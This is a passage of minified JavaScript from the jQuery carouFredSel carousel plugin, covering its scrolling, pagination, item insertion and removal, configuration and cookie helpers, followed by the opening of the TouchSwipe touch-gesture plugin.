M,E,L,j=function(){},O=function(){},R=function(){},D=function(){},N=function(){},H=function(){},W=function(){},A=function(){};switch(e.fx){case"crossfade":case"cover":case"cover-fade":case"uncover":case"uncover-fade":_=$cfs.clone(!0).appendTo($wrp)}switch(e.fx){case"crossfade":case"uncover":case"uncover-fade":_.children().slice(0,i).remove(),_.children().slice(opts.items.visibleConf.old).remove();break;case"cover":case"cover-fade":_.children().slice(opts.items.visible).remove(),_.css(I)}if($cfs.css(P),scrl=sc_setScroll(C,e.easing,conf),x[opts.d.left]=opts.usePadding?opts.padding[opts.d[3]]:0,("variable"==opts[opts.d.width]||"variable"==opts[opts.d.height])&&(j=function(){$wrp.css(b)},O=function(){scrl.anims.push([$wrp,b])}),opts.usePadding){switch(p.not(l).length&&(z[opts.d.marginRight]=l.data("_cfs_origCssMargin"),0>u?l.css(z):(W=function(){l.css(z)},A=function(){scrl.anims.push([l,z])})),e.fx){case"cover":case"cover-fade":_.children().eq(i-1).css(z)}p.not(c).length&&(T[opts.d.marginRight]=c.data("_cfs_origCssMargin"),R=function(){c.css(T)},D=function(){scrl.anims.push([c,T])}),d>=0&&(k[opts.d.marginRight]=p.data("_cfs_origCssMargin")+opts.padding[opts.d[1]],N=function(){p.css(k)},H=function(){scrl.anims.push([p,k])})}L=function(){$cfs.css(x)};var q=opts.items.visible+i-itms.total;E=function(){if(q>0&&($cfs.children().slice(itms.total).remove(),r=$($cfs.children().slice(itms.total-(opts.items.visible-q)).get().concat($cfs.children().slice(0,q).get()))),sc_showHiddenItems(m),opts.usePadding){var t=$cfs.children().eq(opts.items.visible+i-1);t.css(opts.d.marginRight,t.data("_cfs_origCssMargin"))}};var F=sc_mapCallbackArguments(r,g,a,i,"prev",C,b);switch(M=function(){sc_afterScroll($cfs,_,e),crsl.isScrolling=!1,clbk.onAfter=sc_fireCallbacks($tt0,e,"onAfter",F,clbk),queu=sc_fireQueue($cfs,queu,conf),crsl.isPaused||$cfs.trigger(cf_e("play",conf))},crsl.isScrolling=!0,tmrs=sc_clearTimers(tmrs),clbk.onBefore=sc_fireCallbacks($tt0,e,"onBefore",F,clbk),e.fx){case"none":$cfs.css(x),j(),R(),N(),W(),L(),E(),M();break;case"fade":scrl.anims.push([$cfs,{opacity:0},function(){j(),R(),N(),W(),L(),E(),(scrl=sc_setScroll(C,e.easing,conf)).anims.push([$cfs,{opacity:1},M]),sc_startScroll(scrl,conf)}]);break;case"crossfade":$cfs.css({opacity:0}),scrl.anims.push([_,{opacity:0}]),scrl.anims.push([$cfs,{opacity:1},M]),O(),R(),N(),W(),L(),E();break;case"cover":scrl.anims.push([_,x,function(){R(),N(),W(),L(),E(),M()}]),O();break;case"cover-fade":scrl.anims.push([$cfs,{opacity:0}]),scrl.anims.push([_,x,function(){R(),N(),W(),L(),E(),M()}]),O();break;case"uncover":scrl.anims.push([_,S,M]),O(),R(),N(),W(),L(),E();break;case"uncover-fade":$cfs.css({opacity:0}),scrl.anims.push([$cfs,{opacity:1}]),scrl.anims.push([_,S,M]),O(),R(),N(),W(),L(),E();break;default:scrl.anims.push([$cfs,x,function(){E(),M()}]),O(),D(),H(),A()}return sc_startScroll(scrl,conf),cf_setCookie(opts.cookie,$cfs,conf),$cfs.trigger(cf_e("updatePageStatus",conf),[!1,b]),!0})),$cfs.bind(cf_e("slide_next",conf),(function(t,e,i){t.stopPropagation();var o=$cfs.children();if(!opts.circular&&itms.first==opts.items.visible)return opts.infinite&&$cfs.trigger(cf_e("prev",conf),itms.total-1),t.stopImmediatePropagation();if(sz_resetMargin(o,opts),!is_number(i)){if("*"!=opts.items.filter){var n=is_number(e.items)?e.items:gn_getVisibleOrg($cfs,opts);i=gn_getScrollItemsNextFilter(o,opts,0,n)}else i=opts.items.visible;i=cf_getAdjust(i,opts,e.items,$tt0)}var s=0==itms.first?itms.total:itms.first;if(!opts.circular){if(opts.items.visibleConf.variable){var r=gn_getVisibleItemsNext(o,opts,i);n=gn_getVisibleItemsPrev(o,opts,s-1)}else r=opts.items.visible,n=opts.items.visible;i+r>s&&(i=s-n)}if(opts.items.visibleConf.old=opts.items.visible,opts.items.visibleConf.variable){for(r=cf_getItemsAdjust(gn_getVisibleItemsNextTestCircular(o,opts,i,s),opts,opts.items.visibleConf.adjust,$tt0);opts.items.visible-i>=r&&itms.total>i;)i++,r=cf_getItemsAdjust(gn_getVisibleItemsNextTestCircular(o,opts,i,s),opts,opts.items.visibleConf.adjust,$tt0);opts.items.visible=r}else if("*"!=opts.items.filter){r=gn_getVisibleItemsNextFilter(o,opts,i);opts.items.visible=cf_getItemsAdjust(r,opts,opts.items.visibleConf.adjust,$tt0)}if(sz_resetMargin(o,opts,!0),0==i)return t.stopImmediatePropagation(),debug(conf,"0 items to scroll: Not scrolling.");for(debug(conf,"Scrolling "+i+" items forward."),itms.first-=i;0>itms.first;)itms.first+=itms.total;opts.circular||(itms.first==opts.items.visible&&e.onEnd&&e.onEnd.call($tt0,"next"),opts.infinite||nv_enableNavi(opts,itms.first,conf)),itms.total<opts.items.visible+i&&$cfs.children().slice(0,opts.items.visible+i-itms.total).clone(!0).appendTo($cfs);var a=gi_getOldItemsNext(o=$cfs.children(),opts),l=gi_getNewItemsNext(o,opts,i),c=o.eq(i-1),p=a.last(),u=l.last();sz_resetMargin(o,opts);var d=0,h=0;if(opts.align){var f=cf_getAlignPadding(l,opts);d=f[0],h=f[1]}var m=!1,g=$();if(i>opts.items.visibleConf.old&&(g=o.slice(opts.items.visibleConf.old,i),"directscroll"==e.fx)){var v=opts.items[opts.d.width];c=p,sc_hideHiddenItems(m=g),opts.items[opts.d.width]="variable"}var _=!1,y=ms_getTotalSize(o.slice(0,i),opts,"width"),b=cf_mapWrapperSizes(ms_getSizes(l,opts,!0),opts,!opts.usePadding),w=0,x={},S={},z={},T={},k={},P=sc_getDuration(e,opts,i,y);switch(e.fx){case"uncover":case"uncover-fade":w=ms_getTotalSize(o.slice(0,opts.items.visibleConf.old),opts,"width")}m&&(opts.items[opts.d.width]=v),opts.align&&0>opts.padding[opts.d[1]]&&(opts.padding[opts.d[1]]=0),sz_resetMargin(o,opts,!0),sz_resetMargin(p,opts,opts.padding[opts.d[1]]),opts.align&&(opts.padding[opts.d[1]]=h,opts.padding[opts.d[3]]=d),k[opts.d.left]=opts.usePadding?opts.padding[opts.d[3]]:0;var I,C,M,E=function(){},L=function(){},j=function(){},O=function(){},R=function(){},D=function(){};switch(e.fx){case"crossfade":case"cover":case"cover-fade":case"uncover":case"uncover-fade":(_=$cfs.clone(!0).appendTo($wrp)).children().slice(opts.items.visibleConf.old).remove()}switch(e.fx){case"crossfade":case"cover":case"cover-fade":$cfs.css("zIndex",1),_.css("zIndex",0)}if(scrl=sc_setScroll(P,e.easing,conf),x[opts.d.left]=-y,S[opts.d.left]=-w,0>d&&(x[opts.d.left]+=d),("variable"==opts[opts.d.width]||"variable"==opts[opts.d.height])&&(E=function(){$wrp.css(b)},L=function(){scrl.anims.push([$wrp,b])}),opts.usePadding){var N=u.data("_cfs_origCssMargin");h>=0&&(N+=opts.padding[opts.d[1]]),u.css(opts.d.marginRight,N),c.not(p).length&&(T[opts.d.marginRight]=p.data("_cfs_origCssMargin")),j=function(){p.css(T)},O=function(){scrl.anims.push([p,T])};var H=c.data("_cfs_origCssMargin");d>0&&(H+=opts.padding[opts.d[3]]),z[opts.d.marginRight]=H,R=function(){c.css(z)},D=function(){scrl.anims.push([c,z])}}M=function(){$cfs.css(k)};var W=opts.items.visible+i-itms.total;C=function(){W>0&&$cfs.children().slice(itms.total).remove();var t=$cfs.children().slice(0,i).appendTo($cfs).last();if(W>0&&(l=gi_getCurrentItems(o,opts)),sc_showHiddenItems(m),opts.usePadding){if(itms.total<opts.items.visible+i){var e=$cfs.children().eq(opts.items.visible-1);e.css(opts.d.marginRight,e.data("_cfs_origCssMargin")+opts.padding[opts.d[1]])}t.css(opts.d.marginRight,t.data("_cfs_origCssMargin"))}};var A=sc_mapCallbackArguments(a,g,l,i,"next",P,b);switch(I=function(){$cfs.css("zIndex",$cfs.data("_cfs_origCssZindex")),sc_afterScroll($cfs,_,e),crsl.isScrolling=!1,clbk.onAfter=sc_fireCallbacks($tt0,e,"onAfter",A,clbk),queu=sc_fireQueue($cfs,queu,conf),crsl.isPaused||$cfs.trigger(cf_e("play",conf))},crsl.isScrolling=!0,tmrs=sc_clearTimers(tmrs),clbk.onBefore=sc_fireCallbacks($tt0,e,"onBefore",A,clbk),e.fx){case"none":$cfs.css(x),E(),j(),R(),M(),C(),I();break;case"fade":scrl.anims.push([$cfs,{opacity:0},function(){E(),j(),R(),M(),C(),(scrl=sc_setScroll(P,e.easing,conf)).anims.push([$cfs,{opacity:1},I]),sc_startScroll(scrl,conf)}]);break;case"crossfade":$cfs.css({opacity:0}),scrl.anims.push([_,{opacity:0}]),scrl.anims.push([$cfs,{opacity:1},I]),L(),j(),R(),M(),C();break;case"cover":$cfs.css(opts.d.left,$wrp[opts.d.width]()),scrl.anims.push([$cfs,k,I]),L(),j(),R(),C();break;case"cover-fade":$cfs.css(opts.d.left,$wrp[opts.d.width]()),scrl.anims.push([_,{opacity:0}]),scrl.anims.push([$cfs,k,I]),L(),j(),R(),C();break;case"uncover":scrl.anims.push([_,S,I]),L(),j(),R(),M(),C();break;case"uncover-fade":$cfs.css({opacity:0}),scrl.anims.push([$cfs,{opacity:1}]),scrl.anims.push([_,S,I]),L(),j(),R(),M(),C();break;default:scrl.anims.push([$cfs,x,function(){M(),C(),I()}]),L(),O(),D()}return sc_startScroll(scrl,conf),cf_setCookie(opts.cookie,$cfs,conf),$cfs.trigger(cf_e("updatePageStatus",conf),[!1,b]),!0})),$cfs.bind(cf_e("slideTo",conf),(function(t,e,i,o,n,s,r){t.stopPropagation();var a=cf_sortParams([e,i,o,n,s,r],["string/number/object","number","boolean","object","string","function"]);return n=a[3],s=a[4],r=a[5],0!=(e=gn_getItemIndex(a[0],a[1],a[2],itms,$cfs))&&(is_object(n)||(n=!1),"prev"!=s&&"next"!=s&&(s=opts.circular?itms.total/2>=e?"next":"prev":0==itms.first||itms.first>e?"next":"prev"),"prev"==s&&(e=itms.total-e),$cfs.trigger(cf_e(s,conf),[n,e,r]),!0)})),$cfs.bind(cf_e("prevPage",conf),(function(t,e,i){t.stopPropagation();var o=$cfs.triggerHandler(cf_e("currentPage",conf));return $cfs.triggerHandler(cf_e("slideToPage",conf),[o-1,e,"prev",i])})),$cfs.bind(cf_e("nextPage",conf),(function(t,e,i){t.stopPropagation();var o=$cfs.triggerHandler(cf_e("currentPage",conf));return $cfs.triggerHandler(cf_e("slideToPage",conf),[o+1,e,"next",i])})),$cfs.bind(cf_e("slideToPage",conf),(function(t,e,i,o,n){t.stopPropagation(),is_number(e)||(e=$cfs.triggerHandler(cf_e("currentPage",conf)));var s=opts.pagination.items||opts.items.visible,r=Math.ceil(itms.total/s)-1;return 0>e&&(e=r),e>r&&(e=0),$cfs.triggerHandler(cf_e("slideTo",conf),[e*s,0,!0,i,o,n])})),$cfs.bind(cf_e("jumpToStart",conf),(function(t,e){if(t.stopPropagation(),e=e?gn_getItemIndex(e,0,!0,itms,$cfs):0,0!=(e+=itms.first)){if(itms.total>0)for(;e>itms.total;)e-=itms.total;$cfs.prepend($cfs.children().slice(e,itms.total))}return!0})),$cfs.bind(cf_e("synchronise",conf),(function(t,e){if(t.stopPropagation(),e)e=cf_getSynchArr(e);else{if(!opts.synchronise)return debug(conf,"No carousel to synchronise.");e=opts.synchronise}for(var i=$cfs.triggerHandler(cf_e("currentPosition",conf)),o=!0,n=0,s=e.length;s>n;n++)e[n][0].triggerHandler(cf_e("slideTo",conf),[i,e[n][3],!0])||(o=!1);return o})),$cfs.bind(cf_e("queue",conf),(function(t,e,i){return t.stopPropagation(),is_function(e)?e.call($tt0,queu):is_array(e)?queu=e:is_undefined(e)||queu.push([e,i]),queu})),$cfs.bind(cf_e("insertItem",conf),(function(t,e,i,o,n){t.stopPropagation();var s=cf_sortParams([e,i,o,n],["string/object","string/number/object","boolean","number"]);if(e=s[0],i=s[1],o=s[2],n=s[3],(is_object(e)&&!is_jquery(e)||is_string(e))&&(e=$(e)),!is_jquery(e)||0==e.length)return debug(conf,"Not a valid object.");is_undefined(i)&&(i="end"),sz_storeMargin(e,opts),sz_storeOrigCss(e);var r=i,a="before";"end"==i?o?(0==itms.first?(i=itms.total-1,a="after"):(i=itms.first,itms.first+=e.length),0>i&&(i=0)):(i=itms.total-1,a="after"):i=gn_getItemIndex(i,n,o,itms,$cfs);var l=$cfs.children().eq(i);return l.length?l[a](e):(debug(conf,"Correct insert-position not found! Appending item to the end."),$cfs.append(e)),"end"==r||o||itms.first>i&&(itms.first+=e.length),itms.total=$cfs.children().length,itms.first>=itms.total&&(itms.first-=itms.total),$cfs.trigger(cf_e("updateSizes",conf)),$cfs.trigger(cf_e("linkAnchors",conf)),!0})),$cfs.bind(cf_e("removeItem",conf),(function(t,e,i,o){t.stopPropagation();var n=cf_sortParams([e,i,o],["string/number/object","boolean","number"]);if(e=n[0],i=n[1],o=n[2],e instanceof $&&e.length>1)return s=$(),e.each((function(){var t=$cfs.trigger(cf_e("removeItem",conf),[$(this),i,o]);t&&(s=s.add(t))})),s;if(is_undefined(e)||"end"==e)s=$cfs.children().last();else{e=gn_getItemIndex(e,o,i,itms,$cfs);var s=$cfs.children().eq(e);s.length&&itms.first>e&&(itms.first-=s.length)}return s&&s.length&&(s.detach(),itms.total=$cfs.children().length,$cfs.trigger(cf_e("updateSizes",conf))),s})),$cfs.bind(cf_e("onBefore",conf)+" "+cf_e("onAfter",conf),(function(t,e){t.stopPropagation();var i=t.type.slice(conf.events.prefix.length);return is_array(e)&&(clbk[i]=e),is_function(e)&&clbk[i].push(e),clbk[i]})),$cfs.bind(cf_e("currentPosition",conf),(function(t,e){if(t.stopPropagation(),0==itms.first)var i=0;else i=itms.total-itms.first;return is_function(e)&&e.call($tt0,i),i})),$cfs.bind(cf_e("currentPage",conf),(function(t,e){t.stopPropagation();var i,o=opts.pagination.items||opts.items.visible,n=Math.ceil(itms.total/o-1);return 0>(i=0==itms.first||itms.first<itms.total%o?0:itms.first!=o||opts.circular?Math.round((itms.total-itms.first)/o):n)&&(i=0),i>n&&(i=n),is_function(e)&&e.call($tt0,i),i})),$cfs.bind(cf_e("currentVisible",conf),(function(t,e){t.stopPropagation();var i=gi_getCurrentItems($cfs.children(),opts);return is_function(e)&&e.call($tt0,i),i})),$cfs.bind(cf_e("slice",conf),(function(t,e,i,o){if(t.stopPropagation(),0==itms.total)return!1;var n=cf_sortParams([e,i,o],["number","number","function"]);if(e=is_number(n[0])?n[0]:0,i=is_number(n[1])?n[1]:itms.total,o=n[2],e+=itms.first,i+=itms.first,items.total>0){for(;e>itms.total;)e-=itms.total;for(;i>itms.total;)i-=itms.total;for(;0>e;)e+=itms.total;for(;0>i;)i+=itms.total}var s,r=$cfs.children();return s=i>e?r.slice(e,i):$(r.slice(e,itms.total).get().concat(r.slice(0,i).get())),is_function(o)&&o.call($tt0,s),s})),$cfs.bind(cf_e("isPaused",conf)+" "+cf_e("isStopped",conf)+" "+cf_e("isScrolling",conf),(function(t,e){t.stopPropagation();var i=t.type.slice(conf.events.prefix.length),o=crsl[i];return is_function(e)&&e.call($tt0,o),o})),$cfs.bind(cf_e("configuration",conf),(function(e,a,b,c){e.stopPropagation();var reInit=!1;if(is_function(a))a.call($tt0,opts);else if(is_object(a))opts_orig=$.extend(!0,{},opts_orig,a),!1!==b?reInit=!0:opts=$.extend(!0,{},opts,a);else if(!is_undefined(a))if(is_function(b)){var val=eval("opts."+a);is_undefined(val)&&(val=""),b.call($tt0,val)}else{if(is_undefined(b))return eval("opts."+a);"boolean"!=typeof c&&(c=!0),eval("opts_orig."+a+" = b"),!1!==c?reInit=!0:eval("opts."+a+" = b")}if(reInit){sz_resetMargin($cfs.children(),opts),FN._init(opts_orig),FN._bind_buttons();var sz=sz_setSizes($cfs,opts);$cfs.trigger(cf_e("updatePageStatus",conf),[!0,sz])}return opts})),$cfs.bind(cf_e("linkAnchors",conf),(function(t,e,i){return t.stopPropagation(),is_undefined(e)?e=$("body"):is_string(e)&&(e=$(e)),is_jquery(e)&&0!=e.length?(is_string(i)||(i="a.caroufredsel"),e.find(i).each((function(){var t=this.hash||"";t.length>0&&-1!=$cfs.children().index($(t))&&$(this).unbind("click").click((function(e){e.preventDefault(),$cfs.trigger(cf_e("slideTo",conf),t)}))})),!0):debug(conf,"Not a valid object.")})),$cfs.bind(cf_e("updatePageStatus",conf),(function(t,e){if(t.stopPropagation(),opts.pagination.container){var i=opts.pagination.items||opts.items.visible,o=Math.ceil(itms.total/i);e&&(opts.pagination.anchorBuilder&&(opts.pagination.container.children().remove(),opts.pagination.container.each((function(){for(var t=0;o>t;t++){var e=$cfs.children().eq(gn_getItemIndex(t*i,0,!0,itms,$cfs));$(this).append(opts.pagination.anchorBuilder.call(e[0],t+1))}}))),opts.pagination.container.each((function(){$(this).children().unbind(opts.pagination.event).each((function(t){$(this).bind(opts.pagination.event,(function(e){e.preventDefault(),$cfs.trigger(cf_e("slideTo",conf),[t*i,-opts.pagination.deviation,!0,opts.pagination])}))}))})));var n=$cfs.triggerHandler(cf_e("currentPage",conf))+opts.pagination.deviation;return n>=o&&(n=0),0>n&&(n=o-1),opts.pagination.container.each((function(){$(this).children().removeClass(cf_c("selected",conf)).eq(n).addClass(cf_c("selected",conf))})),!0}})),$cfs.bind(cf_e("updateSizes",conf),(function(){var t=opts.items.visible,e=$cfs.children(),i=ms_getParentSize($wrp,opts,"width");if(itms.total=e.length,crsl.primarySizePercentage?(opts.maxDimension=i,opts[opts.d.width]=ms_getPercentage(i,crsl.primarySizePercentage)):opts.maxDimension=ms_getMaxDimension(opts,i),opts.responsive?(opts.items.width=opts.items.sizesConf.width,opts.items.height=opts.items.sizesConf.height,t=(opts=in_getResponsiveValues(opts,e,i)).items.visible,sz_setResponsiveSizes(opts,e)):opts.items.visibleConf.variable?t=gn_getVisibleItemsNext(e,opts,0):"*"!=opts.items.filter&&(t=gn_getVisibleItemsNextFilter(e,opts,0)),!opts.circular&&0!=itms.first&&t>itms.first){if(opts.items.visibleConf.variable)var o=gn_getVisibleItemsPrev(e,opts,itms.first)-itms.first;else if("*"!=opts.items.filter)o=gn_getVisibleItemsPrevFilter(e,opts,itms.first)-itms.first;else o=opts.items.visible-itms.first;debug(conf,"Preventing non-circular: sliding "+o+" items backward."),$cfs.trigger(cf_e("prev",conf),o)}opts.items.visible=cf_getItemsAdjust(t,opts,opts.items.visibleConf.adjust,$tt0),opts.items.visibleConf.old=opts.items.visible,opts=in_getAlignPadding(opts,e);var n=sz_setSizes($cfs,opts);return $cfs.trigger(cf_e("updatePageStatus",conf),[!0,n]),nv_showNavi(opts,itms.total,conf),nv_enableNavi(opts,itms.first,conf),n})),$cfs.bind(cf_e("destroy",conf),(function(t,e){return t.stopPropagation(),tmrs=sc_clearTimers(tmrs),$cfs.data("_cfs_isCarousel",!1),$cfs.trigger(cf_e("finish",conf)),e&&$cfs.trigger(cf_e("jumpToStart",conf)),sz_restoreOrigCss($cfs.children()),sz_restoreOrigCss($cfs),FN._unbind_events(),FN._unbind_buttons(),"parent"==conf.wrapper?sz_restoreOrigCss($wrp):$wrp.replaceWith($cfs),!0})),$cfs.bind(cf_e("debug",conf),(function(){return debug(conf,"Carousel width: "+opts.width),debug(conf,"Carousel height: "+opts.height),debug(conf,"Item widths: "+opts.items.width),debug(conf,"Item heights: "+opts.items.height),debug(conf,"Number of items visible: "+opts.items.visible),opts.auto.play&&debug(conf,"Number of items scrolled automatically: "+opts.auto.items),opts.prev.button&&debug(conf,"Number of items scrolled backward: "+opts.prev.items),opts.next.button&&debug(conf,"Number of items scrolled forward: "+opts.next.items),conf.debug})),$cfs.bind("_cfs_triggerEvent",(function(t,e,i){return t.stopPropagation(),$cfs.triggerHandler(cf_e(e,conf),i)}))},_unbind_events:function(){$cfs.unbind(cf_e("",conf)),$cfs.unbind(cf_e("",conf,!1)),$cfs.unbind("_cfs_triggerEvent")},_bind_buttons:function(){if(FN._unbind_buttons(),nv_showNavi(opts,itms.total,conf),nv_enableNavi(opts,itms.first,conf),opts.auto.pauseOnHover){var t=bt_pauseOnHoverConfig(opts.auto.pauseOnHover);$wrp.bind(cf_e("mouseenter",conf,!1),(function(){$cfs.trigger(cf_e("pause",conf),t)})).bind(cf_e("mouseleave",conf,!1),(function(){$cfs.trigger(cf_e("resume",conf))}))}if(opts.auto.button&&opts.auto.button.bind(cf_e(opts.auto.event,conf,!1),(function(t){t.preventDefault();var e=!1,i=null;crsl.isPaused?e="play":opts.auto.pauseOnEvent&&(e="pause",i=bt_pauseOnHoverConfig(opts.auto.pauseOnEvent)),e&&$cfs.trigger(cf_e(e,conf),i)})),opts.prev.button&&(opts.prev.button.bind(cf_e(opts.prev.event,conf,!1),(function(t){t.preventDefault(),$cfs.trigger(cf_e("prev",conf))})),opts.prev.pauseOnHover)){t=bt_pauseOnHoverConfig(opts.prev.pauseOnHover);opts.prev.button.bind(cf_e("mouseenter",conf,!1),(function(){$cfs.trigger(cf_e("pause",conf),t)})).bind(cf_e("mouseleave",conf,!1),(function(){$cfs.trigger(cf_e("resume",conf))}))}if(opts.next.button&&(opts.next.button.bind(cf_e(opts.next.event,conf,!1),(function(t){t.preventDefault(),$cfs.trigger(cf_e("next",conf))})),opts.next.pauseOnHover)){t=bt_pauseOnHoverConfig(opts.next.pauseOnHover);opts.next.button.bind(cf_e("mouseenter",conf,!1),(function(){$cfs.trigger(cf_e("pause",conf),t)})).bind(cf_e("mouseleave",conf,!1),(function(){$cfs.trigger(cf_e("resume",conf))}))}if(opts.pagination.container&&opts.pagination.pauseOnHover){t=bt_pauseOnHoverConfig(opts.pagination.pauseOnHover);opts.pagination.container.bind(cf_e("mouseenter",conf,!1),(function(){$cfs.trigger(cf_e("pause",conf),t)})).bind(cf_e("mouseleave",conf,!1),(function(){$cfs.trigger(cf_e("resume",conf))}))}if((opts.prev.key||opts.next.key)&&$(document).bind(cf_e("keyup",conf,!1,!0,!0),(function(t){var e=t.keyCode;e==opts.next.key&&(t.preventDefault(),$cfs.trigger(cf_e("next",conf))),e==opts.prev.key&&(t.preventDefault(),$cfs.trigger(cf_e("prev",conf)))})),opts.pagination.keys&&$(document).bind(cf_e("keyup",conf,!1,!0,!0),(function(t){var e=t.keyCode;e>=49&&58>e&&(e=(e-49)*opts.items.visible,itms.total>=e&&(t.preventDefault(),$cfs.trigger(cf_e("slideTo",conf),[e,0,!0,opts.pagination])))})),$.fn.swipe){var e="ontouchstart"in window;if(e&&opts.swipe.onTouch||!e&&opts.swipe.onMouse){var i=$.extend(!0,{},opts.prev,opts.swipe),o=$.extend(!0,{},opts.next,opts.swipe),n=function(){$cfs.trigger(cf_e("prev",conf),[i])},s=function(){$cfs.trigger(cf_e("next",conf),[o])};switch(opts.direction){case"up":case"down":opts.swipe.options.swipeUp=s,opts.swipe.options.swipeDown=n;break;default:opts.swipe.options.swipeLeft=s,opts.swipe.options.swipeRight=n}crsl.swipe&&$cfs.swipe("destroy"),$wrp.swipe(opts.swipe.options),$wrp.css("cursor","move"),crsl.swipe=!0}}if($.fn.mousewheel&&opts.mousewheel){var r=$.extend(!0,{},opts.prev,opts.mousewheel),a=$.extend(!0,{},opts.next,opts.mousewheel);crsl.mousewheel&&$wrp.unbind(cf_e("mousewheel",conf,!1)),$wrp.bind(cf_e("mousewheel",conf,!1),(function(t,e){t.preventDefault(),e>0?$cfs.trigger(cf_e("prev",conf),[r]):$cfs.trigger(cf_e("next",conf),[a])})),crsl.mousewheel=!0}if(opts.auto.play&&$cfs.trigger(cf_e("play",conf),opts.auto.delay),crsl.upDateOnWindowResize){var l=function(){$cfs.trigger(cf_e("finish",conf)),opts.auto.pauseOnResize&&!crsl.isPaused&&$cfs.trigger(cf_e("play",conf)),sz_resetMargin($cfs.children(),opts),$cfs.trigger(cf_e("updateSizes",conf))},c=$(window),p=null;if($.debounce&&"debounce"==conf.onWindowResize)p=$.debounce(200,l);else if($.throttle&&"throttle"==conf.onWindowResize)p=$.throttle(300,l);else{var u=0,d=0;p=function(){var t=c.width(),e=c.height();(t!=u||e!=d)&&(l(),u=t,d=e)}}c.bind(cf_e("resize",conf,!1,!0,!0),p)}},_unbind_buttons:function(){var t=(cf_e("",conf),cf_e("",conf,!1));ns3=cf_e("",conf,!1,!0,!0),$(document).unbind(ns3),$(window).unbind(ns3),$wrp.unbind(t),opts.auto.button&&opts.auto.button.unbind(t),opts.prev.button&&opts.prev.button.unbind(t),opts.next.button&&opts.next.button.unbind(t),opts.pagination.container&&(opts.pagination.container.unbind(t),opts.pagination.anchorBuilder&&opts.pagination.container.children().remove()),crsl.swipe&&($cfs.swipe("destroy"),$wrp.css("cursor","default"),crsl.swipe=!1),crsl.mousewheel&&(crsl.mousewheel=!1),nv_showNavi(opts,"hide",conf),nv_enableNavi(opts,"removeClass",conf)}};is_boolean(configs)&&(configs={debug:configs});var crsl={direction:"next",isPaused:!0,isScrolling:!1,isStopped:!1,mousewheel:!1,swipe:!1},itms={total:$cfs.children().length,first:0},tmrs={auto:null,progress:null,startTime:getTime(),timePassed:0},scrl={isStopped:!1,duration:0,startTime:0,easing:"",anims:[]},clbk={onBefore:[],onAfter:[]},queu=[],conf=$.extend(!0,{},$.fn.carouFredSel.configs,configs),opts={},opts_orig=$.extend(!0,{},options),$wrp="parent"==conf.wrapper?$cfs.parent():$cfs.wrap("<"+conf.wrapper.element+' class="'+conf.wrapper.classname+'" />').parent();if(conf.selector=$cfs.selector,conf.serialNumber=$.fn.carouFredSel.serialNumber++,conf.transition=conf.transition&&$.fn.transition?"transition":"animate",FN._init(opts_orig,!0,starting_position),FN._build(),FN._bind_events(),FN._bind_buttons(),is_array(opts.items.start))var start_arr=opts.items.start;else{var start_arr=[];0!=opts.items.start&&start_arr.push(opts.items.start)}if(opts.cookie&&start_arr.unshift(parseInt(cf_getCookie(opts.cookie),10)),start_arr.length>0)for(var a=0,l=start_arr.length;l>a;a++){var s=start_arr[a];if(0!=s){if(!0===s){if(s=window.location.hash,1>s.length)continue}else"random"===s&&(s=Math.floor(Math.random()*itms.total));if($cfs.triggerHandler(cf_e("slideTo",conf),[s,0,!0,{fx:"none"}]))break}}var siz=sz_setSizes($cfs,opts),itm=gi_getCurrentItems($cfs.children(),opts);return opts.onCreate&&opts.onCreate.call($tt0,{width:siz.width,height:siz.height,items:itm}),$cfs.trigger(cf_e("updatePageStatus",conf),[!0,siz]),$cfs.trigger(cf_e("linkAnchors",conf)),conf.debug&&$cfs.trigger(cf_e("debug",conf)),$cfs},$.fn.carouFredSel.serialNumber=1,$.fn.carouFredSel.defaults={synchronise:!1,infinite:!0,circular:!0,responsive:!1,direction:"left",items:{start:0},scroll:{easing:"swing",duration:500,pauseOnHover:!1,event:"click",queue:!1}},$.fn.carouFredSel.configs={debug:!1,transition:!1,onWindowResize:"throttle",events:{prefix:"",namespace:"cfs"},wrapper:{element:"div",classname:"caroufredsel_wrapper"},classnames:{}},$.fn.carouFredSel.pageAnchorBuilder=function(t){return'<a href="#"><span>'+t+"</span></a>"},$.fn.carouFredSel.progressbarUpdater=function(t){$(this).css("width",t+"%")},$.fn.carouFredSel.cookie={get:function(t){t+="=";for(var e=document.cookie.split(";"),i=0,o=e.length;o>i;i++){for(var n=e[i];" "==n.charAt(0);)n=n.slice(1);if(0==n.indexOf(t))return n.slice(t.length)}return 0},set:function(t,e,i){var o="";if(i){var n=new Date;n.setTime(n.getTime()+864e5*i),o="; expires="+n.toGMTString()}document.cookie=t+"="+e+o+"; path=/"},remove:function(t){$.fn.carouFredSel.cookie.set(t,"",-1)}},$.extend($.easing,{quadratic:function(t){var e=t*t;return t*(-e*t+4*e-6*t+4)},cubic:function(t){return t*(4*t*t-9*t+6)},elastic:function(t){var e=t*t;return t*(33*e*e-106*e*t+126*e-67*t+15)}}))}(jQuery),function(t){"function"==typeof define&&define.amd&&define.amd.jQuery?define(["jquery"],t):t(jQuery)}((function(t){var e="left",i="right",o="up",n="down",s="in",r="out",a="none",l="auto",c="swipe",p="pinch",u="tap",d="doubletap",h="longtap",f="horizontal",m="vertical",g="all",v="start",_="move",y="end",b="cancel",w="ontouchstart"in window,x=window.navigator.msPointerEnabled&&!window.navigator.pointerEnabled,S=window.navigator.pointerEnabled||window.navigator.msPointerEnabled,z="TouchSwipe";function T(e){return!e||void 0!==e.allowPageScroll||void 0===e.swipe&&void 0===e.swipeStatus||(e.allowPageScroll=a),void 0!==e.click&&void 0===e.tap&&(e.tap=e.click),e||(e={}),e=t.extend({},t.fn.swipe.defaults,e),this.each((function(){var i=t(this),o=i.data(z);o||(o=new k(this,e),i.data(z,o))}))}function k(T,k){var $=w||S||!k.fallbackToMouseEvents,P=$?S?x?"MSPointerDown":"pointerdown":"touchstart":"mousedown",I=$?S?x?"MSPointerMove":"pointermove":"touchmove":"mousemove",C=$?S?x?"MSPointerUp":"pointerup":"touchend":"mouseup",M=$?null:"mouseleave",E=S?x?"MSPointerCancel":"pointercancel":"touchcancel",L=0,j=null,O=0,R=0,D=0,N=1,H=0,W=0,A=null,q=t(T),F="start",B=0,Y=null,X=0,V=0,Q=0,U=0,G=0,Z=null,K=null;try{q.bind(P,J),q.bind(E,it)}catch(e){t.error("events not supported "+P+","+E+" on jQuery.swipe")}function J(s){if(!0!==q.data(z+"_intouch")&&!(t(s.target).closest(k.excludedElements,q).length>0)){var r,a=s.originalEvent?s.originalEvent:s,l=w?a.touches[0]:a;return F=v,w?B=a.touches.length:s.preventDefault(),L=0,j=null,W=null,O=0,R=0,D=0,N=1,H=0,Y=function(){for(var 